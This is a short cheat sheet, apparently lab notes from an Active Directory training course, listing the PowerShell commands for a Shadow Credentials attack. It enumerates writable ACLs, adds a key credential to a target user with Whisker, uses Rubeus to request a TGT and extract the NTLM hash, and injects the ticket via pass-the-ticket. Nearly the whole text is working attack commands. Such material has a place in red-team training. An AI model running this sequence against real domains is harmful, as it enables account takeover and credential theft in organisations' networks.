# Shadow Credentials
## Abusing User Object
### 1. Enumerate the permissions
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
```

### 2. Add the Shadow Credential
```powershell
Whisker.exe add /target:supportXuser
```

### 3. Using PowerView, see if the Shadow Credential is added.
```powershell
Get-DomainUser -Identity supportXuser
```

### 4. Request the TGT by leveraging the certificate
```powershell
Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
```

### 5. Inject the TGT in the current session or use the NTLM hash
```powershell
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```
